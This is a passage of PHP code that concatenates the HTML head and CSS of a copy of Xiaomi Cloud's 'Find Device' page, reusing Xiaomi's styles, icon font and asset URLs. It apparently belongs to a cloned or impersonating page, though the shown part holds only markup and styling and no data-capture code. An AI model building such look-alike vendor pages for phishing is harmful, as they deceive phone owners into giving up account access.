	$html .= "\n" . '</style><style>@media print {  .gm-style .gmnoprint, .gmnoprint {    display:none  }}@media screen {  .gm-style .gmnoscreen, .gmnoscreen {    display:none  }}</style><style>.gm-style-pbc{transition:opacity ease-in-out;background-color:rgba(0,0,0,0.45);text-align:center}.gm-style-pbt{font-size:22px;color:white;font-family:Roboto,Arial,sans-serif;position:relative;margin:0;top:50%;-webkit-transform:translateY(-50%);-ms-transform:translateY(-50%);transform:translateY(-50%)}';
	$html .= "\n" . '</style><style>.gm-style img{max-width: none;}.gm-style {font: 400 11px Roboto, Arial, sans-serif; text-decoration: none;}</style>';
	$html .= "\n" . '<title>'.$title.'</title>';
	$html .= "\n" . '<meta charset="utf-8">';
	$html .= "\n" . '<meta name="renderer" content="webkit">';
	$html .= "\n" . '<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">';
	$html .= "\n" . '<meta name="viewport" content="width=device-width,initial-scale=1">';
	$html .= "\n" . '<meta name="theme-color" content="#000000">';
	$html .= "\n" . '<meta name="description" content="Manage your data and devices anytime, anywhere">';
	$html .= "\n" . '<meta name="keywords" content="Xiaomi Cloud, Xiaomi, MI, MIUI, mi phone, data sync, find phone">';
	$html .= "\n" . '<meta name="applicable-device" content="pc,mobile">';
	$html .= "\n" . '';
	$html .= "\n" . '<style>';
	$html .= "\n" . '.oldbrowser {';
	$html .= "\n" . 'height: 100%;';
	$html .= "\n" . 'width: 100%;';
	$html .= "\n" . 'font-size: 14px;';
	$html .= "\n" . 'background-color: #3766d5;';
	$html .= "\n" . 'padding-top: 140px;';
	$html .= "\n" . 'box-sizing: border-box';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .content {';
	$html .= "\n" . 'width: 600px;';
	$html .= "\n" . 'height: 400px;';
	$html .= "\n" . 'background-color: #f6f6f6;';
	$html .= "\n" . 'margin: 0 auto';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .title {';
	$html .= "\n" . 'font-size: 20px;';
	$html .= "\n" . 'line-height: 1.5;';
	$html .= "\n" . 'margin: 0 0 50px 0;';
	$html .= "\n" . 'padding: 20px 0;';
	$html .= "\n" . 'text-align: center;';
	$html .= "\n" . 'border-bottom: 1px solid #b3b3b3';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .desc-1 {';
	$html .= "\n" . 'line-height: 1.2;';
	$html .= "\n" . 'padding-left: 40px';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .desc-2 {';
	$html .= "\n" . 'margin: 20px 0 30px 0;';
	$html .= "\n" . 'padding-left: 40px';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .new {';
	$html .= "\n" . 'padding-left: 20px;';
	$html .= "\n" . 'overflow: hidden';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .new li {';
	$html .= "\n" . 'list-style: none;';
	$html .= "\n" . 'margin-left: 40px;';
	$html .= "\n" . 'float: left;';
	$html .= "\n" . 'width: 110px;';
	$html .= "\n" . 'font-size: 16px;';
	$html .= "\n" . 'height: 142px';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .new li a {';
	$html .= "\n" . 'display: block;';
	$html .= "\n" . 'padding-top: 110px;';
	$html .= "\n" . 'color: #666;';
	$html .= "\n" . 'width: 110px;';
	$html .= "\n" . 'overflow: hidden;';
	$html .= "\n" . 'height: 100%;';
	$html .= "\n" . 'line-height: 20px;';
	$html .= "\n" . 'font-size: 12px;';
	$html .= "\n" . 'text-align: center';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .new li a:hover {';
	$html .= "\n" . 'color: #ff7e00;';
	$html .= "\n" . 'text-decoration: none';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .ch a {';
	$html .= "\n" . 'background: url(https://land.xiaomi.net/res/873a9cc/image/img/micloudv4/v-brow_icos.jpg) 20px 0 no-repeat';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .ff a {';
	$html .= "\n" . 'background: url(https://land.xiaomi.net/res/873a9cc/image/img/micloudv4/v-brow_icos.jpg) -76px 0 no-repeat';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '.oldbrowser .ie a {';
	$html .= "\n" . 'background: url(https://land.xiaomi.net/res/873a9cc/image/img/micloudv4/v-brow_icos.jpg) -170px 0 no-repeat';
	$html .= "\n" . '}';
	$html .= "\n" . '</style>';
	$html .= "\n" . '<style>';
	$html .= "\n" . '.spinner {';
	$html .= "\n" . 'position: fixed;';
	$html .= "\n" . 'left: 50%;';
	$html .= "\n" . 'top: 50%;';
	$html .= "\n" . 'margin: -20px 0 0 -20px;';
	$html .= "\n" . 'width: 40px;';
	$html .= "\n" . 'height: 40px;';
	$html .= "\n" . '-webkit-animation: spinning 1s infinite linear;';
	$html .= "\n" . 'animation: spinning 1s infinite linear;';
	$html .= "\n" . '-webkit-animation-fill-mode: both;';
	$html .= "\n" . 'animation-fill-mode: both';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '@-webkit-keyframes spinning {';
	$html .= "\n" . '0% {';
	$html .= "\n" . '-webkit-transform: rotate(0)';
	$html .= "\n" . '}';
	$html .= "\n" . '100% {';
	$html .= "\n" . '-webkit-transform: rotate(359deg)';
	$html .= "\n" . '}';
	$html .= "\n" . '}';
	$html .= "\n" . '';
	$html .= "\n" . '@keyframes spinning {';
	$html .= "\n" . '0% {';
	$html .= "\n" . 'transform: rotate(0);';
	$html .= "\n" . '-webkit-transform: rotate(0)';
	$html .= "\n" . '}';
	$html .= "\n" . '100% {';
	$html .= "\n" . 'transform: rotate(359deg);';
	$html .= "\n" . '-webkit-transform: rotate(359deg)';
	$html .= "\n" . '}';
	$html .= "\n" . '}';
	$html .= "\n" . '</style>';
	$html .= "\n" . '';
	$html .= "\n" . '';
	$html .= "\n" . '<style type="text/css">';
	$html .= "\n" . ':root .ch[onclick="ga(this,event)"]';
	$html .= "\n" . '{ display: none !important; }</style>';
	$html .= "\n" . '<style type="text/css">.map-view-NKqXN{width:100%;height:100%;position:absolute;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;overflow:hidden}.content-3vSKy{-webkit-user-select:auto;-moz-user-select:auto;-ms-user-select:auto;user-select:auto;display:-webkit-box;display:-ms-flexbox;display:flex;height:100%;width:100%;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.title-3eIso{font-size:18px;color:#000;margin-bottom:15px}.btn-31VNA{display:-webkit-box;display:-ms-flexbox;display:flex;border-radius:3px;border:1px solid #ccc;width:100px;height:40px;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;margin-left:auto;margin-right:auto}</style>';
	$html .= "\n" . '<style type="text/css">@font-face{font-family:iconfont;src:url(//land.xiaomi.net/mcfe/find-device/iconfont.7d0c5c8d.eot);src:url(//land.xiaomi.net/mcfe/find-device/iconfont.7d0c5c8d.eot#iefix) format("embedded-opentype"),url("data:application/x-font-woff2;charset=utf-8;base64,d09GMgABAAAAABJcAAsAAAAAJPAAABIMAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHEIGVgCIcAqvQKQfATYCJAOBWAtuAAQgBYRtB4YyGxceM6M2m7Syk+y/PuAOyRc8MO4gHO5JM9nJ246Odis2XfHS5aGXt7NFl6nwLU35Ixfd6CXBj5W9WFyg4L0eSklErZG99wAoGTQ7QEkYMIocGRUboaNUVGpCJq7aTJP23zb3Pw4kHoTCehxKIwxaHgRwuSuwH3O0hkdaGtA2LoICLLDAGp62+e/ukI00KCMpowB1kYS5UKzEikXj+lj4FbSXWI2rtGo/dK3OXLWr/rT5/wBg359qpbSV6bbU8dY+15WH8QeUYOQDkfa/c9VP8W1SXHRH7jTx80BJugSFQ5qJaW3HFpbBsT4gPVQAAf83V9qdY/ClFH+BbWvrVOVMktvNTCYLx7x8KSEL0wq1UNg9zBYAHGt0dVfX56uMqivYtFFwf2Cc08RoMObypDXoqQdfKdFwTED9tW5OAc3OaoPd9/1ziaJXK6C8pedbSSqhKblFsgZFr7UP/qJOqn7cCwBf+c8v/4GgJKDia0AjHj/tPfgKEjT0dRcqw7vyqrDoC2rAHNRC+aWs+QmQgM5xtajuFeMP7RInZA48FnteaBFIHtsQB1/AmtRZdPuTu7e19/8pniOUF0RJVlTNpBuMQCSRKVQancFksTlcHl8gFIklUplcoVSpNVqd3sjYxNQMpR7+wq1A9QmedQRiSEZgJCMIkhEMkhEdJCNYJCNzkIzggUaIIdAEMQKaIcZAC8QEaIWYAm0QM6AdYg50QCyATsQS6EKsgG6ECfQgLKAX4QB9CBfoR6yBAcQGGERsgSHEDhhG7IERhA+MIgKm3dwFDLgrGHA3MODzwIDPBwO+AAz4QgBjyCJgHFkMTCBLgElkKdMHvgwM+HIw4EIw4CIAc4gYmEckwALiDiwiHsAS4gksI17AChIArCKBTP95ECi0YOPSw1vwjfrv0NQKWleWIPpAioTj5bcK1UnUL+Q01fFCCtRDDUsalvKbi5hb1YuILVVblO4gdM97OH83cm4tPJ9xprT4lHambnqm5SOrZ3trHaFmbbZZjhaY2TahU9YUrW1W81WNqt2lTFGlfkmcuvK7HEPtUSGkRqn4VZLUsh1l2riaiJZT8dhXe29LtZxN2cRuasM+2lN0Km38cFfZjtoGOxlb5yBou9Iu9LeVnYqk93Bn6xlvPKHNcXY0v/2cL5qX0EpmYrFxzSSvN1oe8ahdNcsbrcsy04UR2rzRJrs1+nqWvXTefu8Ue11N3+zkFhru+gV6YnyqOMwpSxn5xX73I6FFBcPboxeX2Nlh6mGrSXnN5PTp36O8OcIK+v6QVWPk2sZJo+kxl8bdKGJ+QEOfR6E30RrlLag95umEbNwdnWlWtVRqlE2wqDJBs0tmmGxe/M0O8kcsejJFYOEWwTy5Y6Emt/FGetMUClob8zJ/j5xVlu+6G39Gz6H1vQ2FgCUCgygpbaynBX5W16CGEJbfE8A6S5zakW9hN1+l+IqyFZLpttKud9esKsfQDpvuqyu/sxGRHJnoXTCX2DMVYCJmQicyUdJCMGvNYFyx1Te2Zr3N2HiTXtDDQsHoK1U0piYi4lAiSd+To1Q/W5P7Bl8SBYvj24o7qlvozZ1spqxdyeXUqT16fFfRpbJl3p6qAzWsuh+MNQbjQ/LHWcJjfkbNLtG59yV+LeOKgkQxCuWsCY/RYSo6RCk0ipbtYB3fNleJItre1cdAgKAy4dgn7Y1mI2W6iW1taozVuZbN0Z7KtmcGNawYrTcVCpO+G/p66s3fesbbzz2ohrIq9UO7UGJSMiqIwQULaCQTyQRDwrKBpmpeKvCHcNyh6hrZ4drjcHzyqqrtNLQY0RbirjPBY095oaTSl8x7TDMlnX8dDx6ZUx8J2ZFOPCqJpT7Gft29+X2Ekapktx7xXzFua2PR4ia8k2ogPWnZmLaeUpxuIxiwun19tq1Sl7aMjUoWlapqPn7MCWqSZvUpk2K5NMGFrrkqedv8coLspmO1+Ysp+MkTj9g28N28j+ZTFpvyrAFaVytKOUmjqh5sHUePceO6GJTGEVKNanPAT8eD88V1QWnW5WUuckBdtdoNYngJGGu4c9d0qI21I3jjydh5ykOvVDWjVEstq1EwBMvRJuUA6VtUKUTCQ6x4zBqfTjTXYm2WXAx1abJCGuvERMZ4F8y/WtXqbWS9Nmsdw95bO9vZ7DTW57qs7Y0OI5FVnloLAdloBoqdTSq1zi83io2h1K1NGykF4wwFG72ZSg4A2sgiDWA7K1pPUfJIWwPXO0BIDaAYj1MIJZGu7IwEuYoRlU7udlD9l2ZxWNReulMaeWSkkSwkYxD5mwsmTDA0Qr90jQK73goeNPqxICOD/a85GaTcIxXMK89uXYcJWBMvjSojbRgS1viCdhpJ8bG6aAn08eXURI0OU5jiWiyZbuD8cRGcUqWcUFPiC02XE1X3hMDIfNMJayBdfANRFWAjR8fB1gNSyxi4yIoES+Kdl4yGfb2R5rU1B9mqUGnVxNxyQDGBvBLR90PkqhpgWq9R5H2hrnGPNrCJ5kDry3Ooo08WakhOShlTWxeDxqWJIe//SHzXu5ufjCl6ub2eGAxquEULHFAK2NSSq5Fx6GDFVscJqgE4Hg1KYO3eZ1ClcuHy18sX7t8rSVxQpUJBteRdFHs6zLil5TjGsf5zYsaRaz/oPSZcgzGsmUVUu6GcRDo8r5DnrCIbHPk2BUwYcQIk/WH4dx66CUmJ9IsnL7v5d7X59bcrR60ulvsEvJ3t0SM/prytGB0VCXcb29hzrQUbe5zPv39T0rw4FQkhiqIcVjvrUKTB4qWKkG+F02nrFnAgXT8v4iHkUZUzKpEW/rgV5QUlriKPFa6XGI4wN2gqgXaytjYysrbWiwy0dvugW0oXuZVfCObC+/cXJxfz7j0JY7y/A5Kz5Ug2O/sqvIO9A/6BbGdvR7TrLmDeJxNiITE/C1Mqh64N2tm1g5qFTk7YYGuPDS5zXlhzvO1Yp+xC8PU943FmKggvgl3hpGPk6+Z9hnkvDF/kOd6WkQZ2FjVcXFYRG4p2DpBkL7dEaV86vQTomyzPeX0+cb6wQjYOlpz9l+Hg6sDoHx/X4+kx9Xn6IpGgulogIxAPYlo662WOXvm6c+OpjTsBmhXafPaOACPB3I/qF+dLTQAJ1P0UNXUXRUPRPlXaKHPi3/i9AbbbrgIsb1rsLpEMWQ+5THPe/volvgdh9V4QmOZMuyBGiSTT7SiIB+D0sqquKh1kflVmcGaIFwgstHQN8P9A1HfUvXGOoefIdIT8OyEnfSc9qgL8gXjTH5bW/HyV8ar7VfqrUZAOukEGALwzjBcvVq4kkuQlX3Xa8vNXrazWvs543f06/XV6gMuYVsy3P5hOTJeqWzFtYU4XpjNA29Ys+NwVRImoCJAFH4TPX4FVsNJ+bZ9PSMiJk8EhQPu6pCQjo6TEWwrArf39QUGNFIPfIN/M2GaALzSPv+zMrpfjzxEDl8jDuY2Sk5DzkKNMUF7B+vU1VDv371ztif8hhq5YAZyA4L3T+7VrUvabKv7v69N27wXAUe/oxueUHHbZ1oDMzCCjNCwCiRgCVF+JGePW/ORr12JioqPrsmoiI88ioKurG+1+eCaA4LFw4ZIlcbHl5epS8HTvKqtWkUasEbUmWa6miV1tXMU0IJMFBTFUnDCIYMmTf/795x/mq1dyqvz1K7DEOPoFXNoHtHisHQvUxsdtbMAi/axS8YZ7IBd86Y/0lR5Y7B0SGu+w//wCOV4U4Gq1fn0Bp4Z/ewyjF8ZVS9t01LRpGntHuSk0louNgEWz1IiagdGPcaRtcCA7NRU6vC27saGs/NjWg1Bq6LFLl+WTqyltlBr6OTcMpiD4DSmyx2IxVwZES5EDp08fQHi4FyNmMOzk/2uom2QQikIyexOfvDi7DEPK+3vg5z3W3HSk8m6b3+FTHU0dqfw75rd5VMcZmWIY5bbpbYqKkCbEcRoAUeOoNVTKI7QU3yA75E7lUdIpvHtwAJ4tm/I23ancVLlAZHwkdgh7BDsUe4Q+S+e6i/+EeYXlsSWA1rwWGR9HRqldBGuEXRKHMHp6GJShILAQ43Nbm4Y/evt0V0ul0zbt3Bl//ynr/6xn5oPHIZ2ZK1Mn6Ay33QbEvvQ64PV1/7nxDDO9N4OneezCTkmbpFPYXZXG5D14Rp/RMX52IP3A0jTgCUCHVLZJvMnVMgZsAjEbdYwNcBdx+oVZhfq4LJxVobjQCgf4PfePgq9QxHBheWVVJlxYUWA5t0TvL4NUg0xKjEE2D/SX3oddXMgvPV0KOXYX5Ac8k3o/vtDzCGMY24vjaQ3b5Ob15t3xfBo7xThLm6U/pc/SzmKHAF//mZppwDzu7g5vPn588yhwYHTuOcIpuvt4iegq/E/HXWdIOKx2h0I2bw5BgQKzQrac6c5kAiYCg5Qk3gjP1ijOW0KWEIm/SRZAn6ERGf8XbTkiPmKR/mcQaTOATEFPwdurq7ebAoOZ5FTyKaRucrJOQcBEOwUFql2TXYE1C82X5YvZGBtvAhl48qEDwQY0Pts3co9vPCMR2Ch8D2/N2QrlmPlmbF3kVmC3dlWnHWU/xTf+NVhYxXoQvXQW2EUPe7pI5k6MC4WjoxBp5YDRwErSFqoa2ULqjzSMvEACtZUrmRHZIBSWV5m1951g4RZYrYa3LOOlPsyY2Glqx2JIeugqilkFJSZCo6xamCid5FuJt8jA4BNaICsQM5tTE82Ntt6aRcmyxLHESTKeLAPnIk7mMwE04yZw+wxuCFMyv3iqWCD1mR87i72MnY2d7629mmWF3bs4jS494zNL12KP58wyZgGOL5eHheFwwUEbR3S5fMx53e73bsDJBaW2wMVJXex8iBzn9X30lIeUFmpS8XPXOMZofd56nMTXK9Wr1THcEdiw0DO8MRp8pbDwG5AWWGJz4QV0HFJfeG5G0og+BCapdtWGes30xQFSMqn/0tV1ziKv9PBzgjbW2mfhf0ySkSNKz+RbSEnWwsCYWd4/ErBE0DRYpYLTDn88DKf5kiQ3IeQRFekOFdZDQx7Ch3iDZspaA40BnpIDr6U0Lwoyu2JWmicEQmGi0FsWJD+v/1P5vwOgbUgPrOBz3weAdgRpQeyH7t0DCOpG5R6yR07IKnNJKv4V6SrKV8ivnCwxV7SpvdN1P0HwiEUdNSnQMC/UgYlxJu1wD9xfV4r2d4lC/hp1ay/8bU2q4ofr8mVG3oY6rUxtfO0bZl9l0cl0TxIelqmujM4V/SJ5mWHjd4My3SVf5hL+IG8fv4Ks46S9eXsCHHRIv0KLtLbA79qO+u4UU5a9mZRu1G43km3v4+0ObeodxKuyDs3rX6eIHZgkpfU/WFntGNBcQrvUy+EbTpqcFWg+7QG/vzd0+9pC69OW/1nQVqFQiU5CjeSJahPfhTrVh1Av+RSavdn13WLhSLA2A2bcPYHMQ3C6f0GYN9LEj+Ct/YTAigjFHv29NXjK08PJS4YRtKpZK7KcXJfLiVj0C75Gk6NmPuQPuVC7mgzH174PJOQyopSFn4o45TJ36t27NcTIqs88g5VhEOmfRyOnuoeh5W7rhBcZGAJaSmN9mZpYLHHHFic3P/4LeFVk5JR17qb+A1lBl65MDI010IeatNbZlqWLBW9K/CpHMWfGukB7J1UQT26m9OpwM2CJoZDD2Xs28rfldNVh/Vr3XFSNvvXSr3fjkEKlZ2BkYmZhZePEzkErFEvlSrVWbzRb7U631x8MR+PJdDZfLFfrzXa3Pzo+OT07v3B8sKxNzrw8CYonZ/Nlo0m+Go/LZTgbuUAvAwl0PImFrA8LIqwclaRWRAnc4doa3lQelFBIKBuqSY/rmlYkKSjaEFK8OLa2vNAiM+08SvYdG0NnG5LPXF7Kf81t6mrLyxtxYc44QeFaKktN107hbYyd34ULzci0hhtkqZSU0bLBwadWD+cv3DWU0H4H08NUrZl86OywjjMOSmovt7S8TELMVXMotVB+WhadH8L7E8uRs45I5dbWfcWYWKAT585EfWznGjs/KWohRAjujK2DowjdVNGY/NTWF7EZos8StziJlQdTJ0uK8eLFSnVLiAvIpTidRZddc20r/dP5grWqFl4R1qUOTmJHaLFVKK97Ezj5+yXkbyrz43KbIbTX92Ps1L61Rf3SbiwrTgK6Zpg90lkHS3TozfyBF8g6tHqZyEV02NoCAAA=") format("woff2"),url(//land.xiaomi.net/mcfe/find-device/iconfont.c4d8b69a.woff) format("woff"),url(//land.xiaomi.net/mcfe/find-device/iconfont.b9182d46.ttf) format("truetype"),url(//land.xiaomi.net/mcfe/find-device/iconfont.a1af0dbd.svg#iconfont) format("svg")}.iconfont-3MHMU{font-family:iconfont!important;font-size:16px;font-style:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.icon-ico_arrow-3W2eS:before{content:"\E601"}.icon-ico_arrow1-2arEv:before{content:"\E602"}.icon-ico_language-3GdND:before{content:"\E603"}.icon-ico_close-1wKo_:before{content:"\E604"}.icon-ico_notice-3oAV8:before{content:"\E605"}.icon-ico_select-2fr46:before{content:"\E606"}.icon-ico_send-EYZOn:before{content:"\E607"}.icon-ico_home-1wC3o:before{content:"\E60A"}.icon-caozuo-shangchuan-38Hui:before{content:"\E618"}.icon-yunxiangcecebianlanicon-1Sg0_:before{content:"\E619"}.icon-caozuo-shanchu-1ax5G:before{content:"\E61A"}.icon-caozuo-xiazai-2i_PS:before{content:"\E61B"}.icon-caozuo-xinxi-24YWm:before{content:"\E61C"}.icon-caozuo-quanbuxuan-2Vl_1:before{content:"\E61D"}.icon-caozuo-quanxuan-3OStQ:before{content:"\E61E"}.icon-caozuo-sousuo-2kwlh:before{content:"\E61F"}.icon-caozuo-close-1aGVT:before{content:"\E620"}.icon-caozuo-back-2e0Qw:before{content:"\E621"}.icon-caozuo-jiadaoxiangce-P1u06:before{content:"\E622"}.icon-caozuo-xuanze-3frP8:before{content:"\E623"}.icon-H-back-1VYVa:before{content:"\E625"}.icon-CombinedShape-3UI-E:before{content:"\E626"}.icon-ico_right-11Wm8:before{content:"\E627"}.icon-ico_more-3bTBp:before{content:"\E628"}.icon-ico_up-3gP5s:before{content:"\E629"}.icon-ico_down-12w3t:before{content:"\E62A"}.icon-ico_back-1ud-Q:before{content:"\E62B"}.icon-ico_erase-sYkRp:before{content:"\E652"}.icon-ico_noise-3pI9s:before{content:"\E653"}.icon-ico_lost-3A5rv:before{content:"\E654"}</style><style type="text/css">.icon-check-37z1E{position:relative;left:-1px;display:none;width:16px;height:16px;font-size:18px}.ico-back-1REiq{font-size:24px;color:#4a4a4a}.error-3o8Ai{color:red;font-size:14px;margin-top:7px}.danger-1P3dp{margin-top:10px;color:#ff6700}.check-wrapper-GumP4{display:-webkit-box;display:-ms-flexbox;display:flex}.check-wrapper-GumP4 .checked-1nijS{position:relative;display:inline-block;font-size:14px;color:#fff;border:1px solid rgba(0,0,0,.1);border-radius:50%;width:16px;height:16px;margin-right:10px;background:#f0f0f0}.check-wrapper-GumP4 .checked-1nijS:hover{color:#3174ff!important}.check-wrapper-GumP4 .enable-1dfzu{color:#3174ff!important;border:none}.check-wrapper-GumP4 .enable-1dfzu .icon-check-37z1E{display:block}.check-wrapper-lock-other-1CoWk{margin-top:17px;font-size:14px}.command-page-290Kt{position:absolute;z-index:1;top:0;left:0;overflow:auto;background:#fff;width:100%;height:100%}.header-2vdvY{display:-webkit-box;display:-ms-flexbox;display:flex;border-bottom:1px solid rgba(0,0,0,.1);height:48px;padding:0 10px}.footer-3ZJ6I{margin-right:auto;margin-left:auto}.content-container-WLZVF{height:calc(100% - 48px)}.content-3Qq3b{text-align:center}.content-3Qq3b.content-step-lock-2AiS_{text-align:left}.title-1Rs01{font-size:18px;font-weight:700;margin-top:22px;margin-bottom:22px}.sub-title-1EU9B{font-size:14px;color:#333;text-align:center}.sub-title-1EU9B.sub-title-enable-3Phaq,.sub-title-1EU9B.sub-title-step-prepare-3eTdA{padding-bottom:27px;margin-bottom:27px;border-bottom:1px solid rgba(0,0,0,.1);color:#666}.sub-title-1EU9B.sub-title-old-version-d6nIO,.sub-title-1EU9B.sub-title-v4-1lPeY{margin-bottom:27px}.sub-title-1EU9B.sub-title-waiting-ycNGL{margin-bottom:10px}.sub-title-1EU9B.sub-title-lock-other-1JuhL{color:#666}.sub-title-1EU9B.sub-title-complete-1B4zq{margin-bottom:8px}.list-3Tx8Z{display:inline-block;font-size:12px;color:#888;text-align:left;list-style-position:inside;margin-bottom:0}.list-3Tx8Z li{margin-bottom:6px;padding-left:18px;text-indent:-18px}.pre-text-Ulmm1{position:relative;margin-bottom:7px}.complete-desc-2T2KH{color:#666;font-size:14px}.btn-gNoEh{color:#fff;border-radius:3px;background:#3174ff;width:100%;font-size:14px;height:48px;margin-right:auto;margin-left:auto;cursor:pointer;text-align:center}.btn-gNoEh:hover{background:#2b69e9}.btn-gNoEh[disabled]{opacity:.6;cursor:not-allowed}.btn-gNoEh[disabled]:hover{background:#3174ff}.btn-lock-f0KtJ{border:1px solid rgba(0,0,0,.2);font-size:14px;width:50%;height:48px;cursor:pointer;background:#fff}.btn-lock-f0KtJ.btn-lock-cancel-J0euz{position:relative;right:-1px;border-radius:3px 0 0 3px}.btn-lock-f0KtJ.btn-lock-confirm-2vFTf{border-radius:0 3px 3px 0;color:#3174ff}.btn-lock-f0KtJ:hover{background:#fafafa}.back-1LLGj{display:-webkit-box;display:-ms-flexbox;display:flex;text-align:left;-webkit-box-align:center;-ms-flex-align:center;align-items:center;color:#000}.back-1LLGj:active,.back-1LLGj:hover{color:#000}.textarea-3s_Ej{display:block;font-size:14px;color:#414141;border:1px solid rgba(0,0,0,.1);border-radius:3px;background:#f9f9f9;width:100%;margin-top:20px;margin-bottom:15px;padding:16px}.input-grids-1Pso8{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.input-grid-1FEwA{width:60px;height:50px;border-radius:3px;border:1px solid rgba(0,0,0,.1);line-height:48px;border-color:#ccc}.input-grid-1FEwA.focused-jpk8X{border-color:#999}.hidden-input-29nGN{position:relative;top:0;left:0;display:block;width:10px;height:10px;line-height:10px;border:0;margin:0;padding:0;opacity:0;text-indent:-9999em;outline:none;-webkit-appearance:none;z-index:-999}.grids-container-1FKYe{margin-top:20px;max-width:400px;margin-left:auto;margin-right:auto}.security-desc-3J7e0{border-top:1px solid rgba(0,0,0,.1);padding-top:27px}.security-desc-3J7e0 .security-desc-inner-3xf9N{width:80%;margin-left:auto;margin-right:auto}.security-desc-3J7e0 .security-desc-inner-3xf9N .security-desc-item1-mCRXU{font-size:16px;font-weight:700;text-align:center;margin-bottom:29px}.security-desc-3J7e0 .security-desc-inner-3xf9N .security-desc-item2-1p6Lj{font-size:13px;color:#666}@media (min-width:701px){.img-Of1SK{width:100px}.img-lockother-1er50{width:300px}.content-3Qq3b{padding-top:80px;line-height:18px;width:26.18%;min-width:400px;max-width:700px;margin-left:auto;margin-right:auto}.list-3Tx8Z{width:90%}.footer-3ZJ6I{margin-top:50px;padding-bottom:20px;width:26.18%;min-width:400px;max-width:700px}}@media (max-width:700px){.img-Of1SK{width:78px}.img-lockother-1er50{width:270px}.content-3Qq3b{-webkit-overflow-scrolling:touch;overflow-x:hidden;overflow-y:auto;margin:0 20px;padding-top:45px;padding-bottom:10px;line-height:18px;min-height:calc(100% - 72px);position:relative}.footer-3ZJ6I{margin-bottom:10px;padding-left:20px;padding-right:20px;width:100%}}</style><style type="text/css">.message-3xNcF{line-height:22px;font-size:14px}.footer-1l7DH{text-align:right}.btn-cancel-B-dWL,.btn-confirm-1ohr8{display:inline-block;padding:8px 30px;border-radius:3px;font-size:14px;cursor:pointer}.btn-confirm-1ohr8{background:#f7413a;color:#fff;margin-left:20px}.btn-cancel-B-dWL{border:1px solid #999}</style><style type="text/css">.pending-panel-2jSz- .note-2DoY7,.pending-panel-2jSz- .title-35b21{color:#ff6700;font-size:12px}.pending-panel-2jSz- .title-35b21{margin-bottom:5px}.pending-panel-2jSz- .note-2DoY7{margin-bottom:0}</style><style type="text/css">.status-container-3dQ_7 .status-1tXVL{color:#333}.status-container-3dQ_7 .status-1tXVL:before{display:inline-block;border-radius:50%;width:8px;height:8px;margin-right:6px;content:""}.status-container-3dQ_7 .online-12vm1:before{background:#45d426}.status-container-3dQ_7 .offline-2FWNW:before{background:#999}.device-detail-2u2Dc{position:absolute;z-index:100;top:20px;right:20px;font-size:14px;border-radius:10px;background:#fff;-webkit-box-shadow:0 4px 8px 0 rgba(0,0,0,.3);box-shadow:0 4px 8px 0 rgba(0,0,0,.3);width:340px}.header-f-4vz{display:-webkit-box;display:-ms-flexbox;display:flex;padding:20px 20px 0;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.content-3f50n{padding:8px 20px 22px;text-align:center}.content-3f50n .device-cover-1TLAw{height:120px;margin-bottom:16px}.content-3f50n .device-cover-1TLAw.small-1Arga{height:80px}.bottom-DjW8a{display:-webkit-box;display:-ms-flexbox;display:flex;border-top:1px solid #e6e6e6;padding-top:22px;margin-left:20px;margin-right:20px;padding-bottom:40px;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.feature-gcm95{font-size:14px;color:#000;-webkit-box-flex:1;-ms-flex:1 1;flex:1 1;text-align:center}.feature-gcm95 span{line-height:14px}.feature-gcm95 .success-1yxIs,.feature-gcm95 .waiting-1VgmR{color:#17a536}.feature-gcm95,.feature-gcm95 .timeout-14ebr{color:red}.feature-gcm95 .feature-icon-2LjqL{display:inline-block;font-size:24px;cursor:pointer}.feature-gcm95 .feature-icon-2LjqL .command-name-2aoU6{font-size:14px;margin-top:16px}.feature-gcm95 .feature-icon-2LjqL:active,.feature-gcm95 .feature-icon-2LjqL:hover{color:#3174ff}.back-3DVFa,.more-33DUW{display:-webkit-box;display:-ms-flexbox;display:flex;font-weight:700;border:1px solid #9b9b9b;border-radius:4px;width:32px;height:32px;cursor:pointer;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-transition:background .1s;transition:background .1s}.more-33DUW{position:relative}.back-3DVFa:hover,.more-33DUW:hover{background:#fafafa}.ico-back-2cB3h,.ico-erase-3vZOq,.ico-lost-Yg2Md,.ico-more-1Tf95,.ico-noise-1mz4Y{font-size:16px;color:#4a4a4a}.name-2KbNg{display:block;font-size:16px;line-height:16px;text-align:center;font-weight:700}.menu-item-2JOfA{padding:12px;display:block;font-size:14px;color:#000;cursor:pointer;border-top:1px solid #f1f1f1}.menu-item-2JOfA:hover{color:#3174ff}.menu-3FdV-{-webkit-box-shadow:0 1px 6px 0 rgba(0,0,0,.3);box-shadow:0 1px 6px 0 